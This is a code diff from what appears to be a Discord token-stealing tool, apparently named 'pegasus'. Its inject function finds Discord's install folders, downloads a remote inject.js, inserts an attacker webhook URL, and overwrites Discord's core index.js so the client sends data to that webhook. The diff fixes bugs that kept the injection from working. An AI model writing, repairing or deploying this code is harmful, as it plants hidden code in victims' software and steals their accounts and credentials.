@@ -425,12 +425,12 @@ def cleanup():
 def inject(webhook_url):
     appdata = os.getenv("localappdata")
     for _dir in os.listdir(appdata):
-        if 'Discord' in _dir.lower():
-            for dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
-                if match(r'app-(\d.\d)*', dir):
-                    abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+_dir) 
-                    f = requests.get("https://github.com/addi00000/pegasus/blob/main/inject.js).text.replace(%WEBHOOK%", webhook_url)
-                    with open(abspath+'\modules\discord_desktop_core-2\discord_desktop_core\index.js', 'w', encoding="utf-8") as indexFile:
+        if 'discord' in _dir.lower():
+            for __dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
+                if match(r'app-(\d*\.\d*)*', __dir):
+                    abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+__dir) 
+                    f = requests.get("https://raw.githubusercontent.com/addi00000/pegasus/main/inject.js").text.replace("%WEBHOOK%", webhook_url)
+                    with open(abspath+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
                         indexFile.write(f)
                     os.startfile(abspath+os.sep+_dir+'.exe')
                            
